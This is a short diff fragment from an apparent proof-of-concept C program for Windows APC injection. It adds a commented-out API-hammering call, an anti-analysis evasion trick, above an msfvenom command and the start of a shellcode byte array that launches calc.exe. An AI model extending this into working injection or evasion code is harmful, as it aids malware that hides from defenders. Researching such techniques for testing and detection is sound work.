@@ -5,6 +5,8 @@
 // POC for testing APC injection
 int main()
 {
+	// ApiHammering(2000);
+
 	// msfvenom --platform windows --arch x64 -p windows/x64/exec CMD=calc.exe -f c -exitfunc thread
 	unsigned char pPayload[] =
 		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
